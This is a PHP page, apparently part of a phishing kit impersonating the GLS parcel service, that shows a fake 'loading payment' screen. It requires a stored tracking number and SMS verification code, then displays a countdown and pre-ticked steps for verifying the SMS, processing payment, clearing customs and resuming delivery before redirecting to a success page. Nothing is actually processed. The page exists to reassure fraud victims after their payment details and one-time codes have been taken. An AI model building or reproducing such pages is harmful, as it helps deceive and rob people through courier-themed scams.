<?php
session_start();
require_once 'config.php';
require_once 'languages.php';

// Check if user should be here
if (!isset($_SESSION['tracking_number']) || !isset($_SESSION['verification_code'])) {
    header('Location: index.php');
    exit;
}

$pageTitle = t('loading_payment');
include 'includes/header.php';
?>

<style>
.loading-container {
    min-height: 80vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--gls-bg);
}

.loading-content {
    text-align: center;
    padding: 3rem;
    background: white;
    border-radius: 1rem;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
    max-width: 500px;
}

.spinner {
    width: 80px;
    height: 80px;
    margin: 0 auto 2rem;
    border: 8px solid var(--gls-light-blue);
    border-top: 8px solid var(--gls-blue);
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.countdown {
    font-size: 4rem;
    font-weight: bold;
    color: var(--gls-blue);
    margin: 1rem 0;
    animation: pulse 1s ease-in-out infinite;
}

@keyframes pulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.8; }
}

.progress-bar {
    width: 100%;
    height: 8px;
    background: #e5e7eb;
    border-radius: 9999px;
    overflow: hidden;
    margin-top: 2rem;
}

.progress-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--gls-blue), var(--gls-yellow));
    width: 0%;
    transition: width 0.3s ease;
    animation: progress 10s linear forwards;
}

@keyframes progress {
    0% { width: 0%; }
    100% { width: 100%; }
}

.status-list {
    text-align: left;
    margin-top: 2rem;
}

.status-item {
    display: flex;
    align-items: center;
    gap: 1rem;
    padding: 0.75rem;
    margin-bottom: 0.5rem;
    background: #f9fafb;
    border-radius: 0.5rem;
    opacity: 0;
    animation: fadeIn 0.5s ease forwards;
}

.status-item:nth-child(1) { animation-delay: 0.5s; }
.status-item:nth-child(2) { animation-delay: 2s; }
.status-item:nth-child(3) { animation-delay: 4s; }
.status-item:nth-child(4) { animation-delay: 6s; }

@keyframes fadeIn {
    to { opacity: 1; }
}

.check-icon {
    width: 24px;
    height: 24px;
    background: #10b981;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-weight: bold;
}

.loading-icon {
    width: 24px;
    height: 24px;
    border: 3px solid var(--gls-light-blue);
    border-top: 3px solid var(--gls-blue);
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}
</style>

<div class="page-transition">
    <div class="loading-container">
        <div class="loading-content">
            <div class="spinner"></div>

            <h1 style="font-size: 2rem; color: var(--gls-blue); margin-bottom: 1rem;">
                <?php echo t('loading_payment'); ?>
            </h1>

            <div class="countdown" id="countdown">10</div>

            <p style="color: #6b7280; font-size: 1.125rem;">
                <?php echo t('please_wait'); ?>
            </p>

            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <div class="status-list">
                <div class="status-item">
                    <div class="check-icon">✓</div>
                    <span><?php echo t('verifying_sms'); ?></span>
                </div>
                <div class="status-item">
                    <div class="check-icon">✓</div>
                    <span><?php echo t('processing_payment'); ?></span>
                </div>
                <div class="status-item">
                    <div class="check-icon">✓</div>
                    <span><?php echo t('clearing_customs'); ?></span>
                </div>
                <div class="status-item">
                    <div class="loading-icon"></div>
                    <span><?php echo t('resuming_delivery'); ?></span>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
// Countdown from 10 to 0
let countdown = 10;
const countdownElement = document.getElementById('countdown');

const interval = setInterval(() => {
    countdown--;
    countdownElement.textContent = countdown;

    if (countdown <= 0) {
        clearInterval(interval);
        countdownElement.textContent = '✓';
        setTimeout(() => {
            window.location.href = 'success.php';
        }, 500);
    }
}, 1000);

// Fallback redirect after 11 seconds
setTimeout(() => {
    window.location.href = 'success.php';
}, 11000);
</script>

<?php include 'includes/footer.php'; ?>
